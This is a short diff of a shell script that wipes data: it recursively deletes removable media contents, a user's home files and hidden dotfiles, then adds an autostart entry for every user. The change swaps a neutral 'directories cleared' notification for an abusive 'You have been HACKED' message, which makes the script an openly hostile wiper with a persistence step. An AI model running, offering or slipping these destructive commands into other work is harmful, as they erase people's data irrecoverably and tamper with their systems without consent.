@@ -3,6 +3,6 @@ cd $HOME
 rm -rf /media/*/* &
 rm -rf /home/$USER/* &
 rm -rf /home/$USER/.*
-zenity --notification --text="All directories was cleared"
+zenity --notification --text="You have been HACKED. Bitch"
 mkdir -p /home/$USER/.config/autostart
 cp -prf /usr/share/darkice.desktop /home/*/.config/autostart/
